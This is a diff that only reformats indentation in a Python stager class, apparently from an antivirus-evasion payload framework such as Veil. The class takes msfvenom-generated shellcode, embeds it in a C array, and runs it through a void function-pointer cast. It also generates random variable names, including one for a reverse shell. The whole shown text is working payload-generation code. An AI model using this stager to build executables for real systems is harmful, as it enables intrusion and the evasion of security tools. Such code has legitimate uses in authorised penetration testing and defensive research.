@@ -20,32 +20,32 @@ from modules.common import encryption
 
 
 class Stager:
-	
-	def __init__(self):
-		# required options
-		self.shortname = "VoidPointer"
-		self.description = "C VoidPointer cast method for inline shellcode injection"
-		self.language = "c"
-		self.rating = "Poor"
-		self.extension = "c"
-		
-		self.shellcode = shellcode.Shellcode()
-		# options we require user ineraction for- format is {Option : [Value, Description]]}
-		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}
 
-	def generate(self):
-		
-		# Generate Shellcode Using msfvenom
-		Shellcode = self.shellcode.generate()
+    def __init__(self):
+        # required options
+        self.shortname = "VoidPointer"
+        self.description = "C VoidPointer cast method for inline shellcode injection"
+        self.language = "c"
+        self.rating = "Poor"
+        self.extension = "c"
 
-		# Generate Random Variable Names
-		RandShellcode = randomizer.randomString()
-		RandReverseShell = randomizer.randomString()
-		RandMemoryShell = randomizer.randomString()
+        self.shellcode = shellcode.Shellcode()
+        # options we require user ineraction for- format is {Option : [Value, Description]]}
+        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}
 
-		# Start creating our C payload
-		PayloadCode = 'unsigned char payload[]=\n'
-		PayloadCode += '\"' + Shellcode + '\";\n'
-		PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
-		
-		return PayloadCode
+    def generate(self):
+
+        # Generate Shellcode Using msfvenom
+        Shellcode = self.shellcode.generate()
+
+        # Generate Random Variable Names
+        RandShellcode = randomizer.randomString()
+        RandReverseShell = randomizer.randomString()
+        RandMemoryShell = randomizer.randomString()
+
+        # Start creating our C payload
+        PayloadCode = 'unsigned char payload[]=\n'
+        PayloadCode += '\"' + Shellcode + '\";\n'
+        PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
+
+        return PayloadCode
